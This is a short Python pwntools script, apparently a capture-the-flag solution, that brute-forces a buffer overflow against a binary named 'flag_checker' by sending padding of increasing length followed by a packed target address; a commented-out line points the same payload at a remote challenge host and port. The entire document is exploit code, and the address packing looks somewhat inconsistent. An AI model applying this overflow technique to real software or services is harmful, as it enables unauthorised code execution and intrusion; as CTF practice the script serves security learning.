from pwn import *

# Set the host and port to connect to
HOST = "178.128.106.114"
PORT = 1337


#create buffer
for i in range(1,1000):
    buffer = b'A'*i
    e = ELF("./flag_checker")
    hit = p32(0x00000000004040c0)

    payload = buffer
    payload += hit
    
    # Create a process to execute the nc command
    # nc_process = process(["nc", HOST, str(PORT)])
    nc_process = process("./flag_checker")

    # Interact with the process to send and receive data
    print(nc_process.recvline())
    print(nc_process.recvline())
    nc_process.sendline(payload)
    print(nc_process.recvline())
    
    # Close the connection
    nc_process.close()

